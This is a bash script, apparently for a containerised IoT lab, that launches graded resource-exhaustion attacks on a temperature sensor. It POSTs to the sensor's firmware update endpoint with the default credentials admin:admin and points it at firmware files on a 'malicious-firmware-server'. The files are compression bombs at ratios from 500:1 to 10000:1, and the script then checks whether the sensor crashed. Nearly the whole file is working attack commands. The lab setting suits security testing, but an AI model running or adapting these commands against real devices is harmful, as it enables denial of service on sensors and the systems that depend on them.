#!/bin/bash
# Individual curl commands for resource exhaustion attacks

# ===========================================================================
# IMPORTANT: These commands assume that both the sensor containers and the 
# malicious firmware server are running and connected to the same network.
# ===========================================================================

# Check that the malicious firmware server is accessible
echo "==== Testing malicious firmware server access ===="
curl -s http://malicious-firmware-server:8080/ | grep firmware

# Monitor sensor resources in a separate terminal:
# watch -n 1 'curl -s http://temperature-sensor-01:12380/health/resources | jq'

# ==== MILD ATTACK (500:1 compression ratio) ====
# Use this for a mild resource exhaustion that might not crash the sensor
curl -X POST -u admin:admin \
     -H "Content-Type: application/json" \
     -d '{"firmware_url": "http://malicious-firmware-server:8080/mild_firmware.sh", "version": "1.2.3-MILD"}' \
     http://temperature-sensor-01:12380/firmware/update

# ==== MEDIUM ATTACK (2000:1 compression ratio) ====
# Use this for a more noticeable resource exhaustion
curl -X POST -u admin:admin \
     -H "Content-Type: application/json" \
     -d '{"firmware_url": "http://malicious-firmware-server:8080/medium_firmware.sh", "version": "1.2.3-MEDIUM"}' \
     http://temperature-sensor-01:12380/firmware/update

# ==== SEVERE ATTACK (5000:1 compression ratio) ====
# This will likely cause significant resource problems
curl -X POST -u admin:admin \
     -H "Content-Type: application/json" \
     -d '{"firmware_url": "http://malicious-firmware-server:8080/severe_firmware.sh", "version": "1.2.3-SEVERE"}' \
     http://temperature-sensor-01:12380/firmware/update

# ==== EXTREME ATTACK (10000:1 compression ratio) ====
# May crash the sensor completely requiring a restart
curl -X POST -u admin:admin \
     -H "Content-Type: application/json" \
     -d '{"firmware_url": "http://malicious-firmware-server:8080/extreme_firmware.sh", "version": "1.2.3-EXTREME"}' \
     http://temperature-sensor-01:12380/firmware/update

# Check sensor health after the attack
curl -s http://temperature-sensor-01:12380/health | jq

# Try accessing temperature data during/after attack to see if service is affected
curl -s http://temperature-sensor-01:12380/temperature | jq

# If you need to restart a container after a successful DoS attack:
# docker restart temperature-sensor-01